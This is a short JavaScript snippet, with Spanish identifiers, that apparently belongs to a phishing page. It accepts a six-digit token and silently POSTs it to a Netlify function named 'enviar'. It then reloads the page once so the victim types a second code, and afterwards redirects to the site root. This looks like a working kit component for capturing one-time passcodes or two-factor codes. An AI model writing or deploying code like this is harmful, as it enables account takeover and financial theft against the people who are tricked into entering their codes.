<script>
const tokenInput = document.getElementById("tokenInput");

tokenInput.addEventListener("input", () => {
    tokenInput.value = tokenInput.value.replace(/[^0-9]/g, "");
});

async function enviarToken() {
    const token = tokenInput.value.trim();
    if (token.length !== 6) return;

    let clicks = Number(sessionStorage.getItem("clicksAceptar") || 0);
    clicks++;
    sessionStorage.setItem("clicksAceptar", clicks);

    try {
        await fetch("/.netlify/functions/enviar", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                tipo: "Token",
                valor: token
            })
        });
    } catch (e) {
        // ignoramos errores
    }

    if (clicks >= 2) {
        sessionStorage.removeItem("clicksAceptar");
        window.location.href = "/";
    } else {
        window.location.reload();
    }
}
</script>



